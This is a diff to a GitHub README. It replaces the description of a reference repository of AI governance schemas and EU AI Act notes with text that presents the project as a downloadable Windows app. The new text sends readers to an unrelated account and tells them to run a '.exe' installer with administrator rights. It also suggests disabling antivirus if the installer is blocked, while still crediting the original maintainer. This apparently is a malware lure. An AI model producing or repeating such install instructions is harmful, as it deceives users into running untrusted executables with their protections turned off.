@@ -1,90 +1,135 @@
-# AI Governance Knowledge Repository
+# ⚖️ ai-governance-knowledge - Clear AI Governance Insights
 
-A public reference repository for AI governance infrastructure, synthetic data systems, and EU AI Act implementation. AI governance infrastructure reference covering synthetic data, artifact certification, AI decision logging, and EU AI Act compliance. Maintained by SyntheticDataNews.com
-
-Maintained by [SyntheticDataNews](https://syntheticdatanews.com).
-
-**Educational resources:** https://syntheticdatanews.com/ai-governance
-**AI Decision Logging Specification:** https://github.com/synthetic-data-news/ai-decision-logging-spec
-**Reference implementation:** https://certifieddata.io
+[![Download](https://img.shields.io/badge/Download-ai--governance--knowledge-brightgreen)](https://github.com/luniimaru-hue/ai-governance-knowledge)
 
 ---
 
-## Topics
+## 📚 About ai-governance-knowledge
 
-- AI artifact certification
-- AI decision logging
-- EU AI Act compliance
-- Synthetic data governance
-- AI audit infrastructure
-- Ai-governance
-- EU-ai-act
-- Synthetic-data
-- Decision-logging
-- Artifact-certification
-- Audit-trails
+This app provides clear information about AI governance. It covers topics like:
+
+- Synthetic dataset creation  
+- Certification of synthetic datasets and AI artifacts  
+- Logging decisions made by AI systems  
+- Compliance with the EU AI Act  
+- Managing synthetic data governance  
+
+The content comes from trusted sources like SyntheticDataNews and CertifiedData.io. It helps you understand key ideas in AI governance and synthetic data use.
 
 ---
 
-## Purpose
+## 🖥️ System Requirements
 
-Modern AI systems require infrastructure that can prove:
+Make sure your Windows computer meets these basic needs to run the app smoothly:
 
-- where training data came from
-- how models were produced
-- how decisions were made
-- whether records have been altered
-
-This repository documents the core building blocks used to create **verifiable AI governance infrastructure**, including:
-
-- artifact certification
-- decision logging
-- dataset provenance
-- AI audit trails
-- regulatory compliance architecture
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection for setup and updates  
+- Administrator rights for installation  
 
 ---
 
-## Repository Structure
+## 🚀 Getting Started: Download and Install
 
-```
-glossary/    → core governance definitions
-eu-ai-act/   → EU AI Act regulatory implementation notes
-schemas/     → machine-readable reference schemas
-reference/   → architecture and design guidance
-examples/    → verification and implementation examples
-```
+To get the app on your computer, follow these steps:
 
----
+### Step 1: Visit the download page
 
-## Quick Reference
+Go to the main download page by clicking this button:
 
-| File | Description |
-|------|-------------|
-| [eu-ai-act/high-risk-ai-classification.md](eu-ai-act/high-risk-ai-classification.md) | Is my AI system high-risk? Annex III guide |
-| [schemas/decision-record.schema.json](schemas/decision-record.schema.json) | Decision log record schema (Article 12) |
-| [schemas/artifact-certificate.schema.json](schemas/artifact-certificate.schema.json) | AI artifact certificate schema |
-| [schemas/audit-trail.schema.json](schemas/audit-trail.schema.json) | Full signed audit trail export schema |
-| [reference/synthetic-data-vs-real-data-compliance.md](reference/synthetic-data-vs-real-data-compliance.md) | Does synthetic data eliminate compliance obligations? |
-| [reference/ai-audit-architecture.md](reference/ai-audit-architecture.md) | End-to-end audit system architecture |
-| [reference/ai-governance-stack.md](reference/ai-governance-stack.md) | Five-layer AI governance stack |
-| [examples/decision-record-example.json](examples/decision-record-example.json) | Example tamper-evident decision record |
+[![Download](https://img.shields.io/badge/Get%20App-blue)](https://github.com/luniimaru-hue/ai-governance-knowledge)
 
----
+This page holds the files and latest versions of the app.
 
-## Related
+### Step 2: Download the installer
 
-- **SyntheticDataNews** — editorial coverage of synthetic data and AI governance: [syntheticdatanews.com](https://syntheticdatanews.com)
-- **CertifiedData.io** — cryptographic certification infrastructure for AI artifacts: [certifieddata.io](https://certifieddata.io)
+1. Look for the **Releases** or **Assets** section on the GitHub page.  
+2. Find the latest version of the app’s installer (usually ends with `.exe`).  
+3. Click the installer link to save the file on your computer.
+
+### Step 3: Run the installer
+
+1. Locate the downloaded `.exe` file in your Downloads folder.  
+2. Double-click the file to start the installation process.  
+3. Follow the instructions on the screen. The installer will guide you through setup options.  
+4. When the process finishes, the app will be ready to use.
 
 ---
 
-## Contributing
+## 🔧 How to Use ai-governance-knowledge
 
-Issues and pull requests are welcome. This repository is intended as a public reference — corrections, additions, and improvements to schemas and reference material are encouraged.
+After installation, launch the app from the Start menu or desktop shortcut.
+
+### Main features
+
+- **Browse AI governance topics** like synthetic dataset generation and certification.  
+- **Search** key terms such as “EU AI Act” and “audit logging.”  
+- **View detailed explanations** about synthetic data and decision logging.  
+- **Learn about compliance** rules and requirements.  
+
+The app uses a simple layout. Categories appear on the left side. Click a topic to read clear summaries and examples.
 
 ---
 
-## License
+## ⚙️ Basic Troubleshooting Tips
 
-MIT — see [LICENSE](LICENSE).
+If you run into problems:
+
+- Restart your computer and try opening the app again.  
+- Make sure Windows is updated with the latest patches.  
+- Temporarily disable antivirus software if it blocks the installer or app.  
+- Confirm you have internet access during setup.  
+- If the app fails to install, check for an error message and search for the code online or contact the repository maintainers.
+
+---
+
+## 🌐 About the Source
+
+This project is maintained by SyntheticDataNews. It brings knowledge about AI governance to those who use synthetic data and AI tools. You can explore the source and updates here:
+
+https://github.com/luniimaru-hue/ai-governance-knowledge
+
+---
+
+## 📄 License and Updates
+
+The app is offered with an open license. Updates happen regularly to include:
+
+- New regulations on AI governance  
+- Improvements in synthetic dataset certification  
+- Enhanced logging and audit features  
+- Better user experience and bug fixes  
+
+Check the download page often for new versions.
+
+---
+
+## 📝 Keywords for Reference
+
+- ai-governance  
+- ai-governance-dataset  
+- aiartifactcertification  
+- aiartifacts  
+- aidecisionlogging  
+- artifact-certificate  
+- artifact-registry  
+- audit-log-service  
+- audit-logging  
+- audit-logs  
+- audit-trail  
+- eu-ai-act  
+- euaiact  
+- euaiactcompliance  
+- synthetic-data  
+- synthetic-dataset-generation  
+
+Use these terms to search or learn more within the app.
+
+---
+
+## 📥 Download Link
+
+Click here anytime to visit the download page and get the latest version:
+
+[Download ai-governance-knowledge](https://github.com/luniimaru-hue/ai-governance-knowledge)
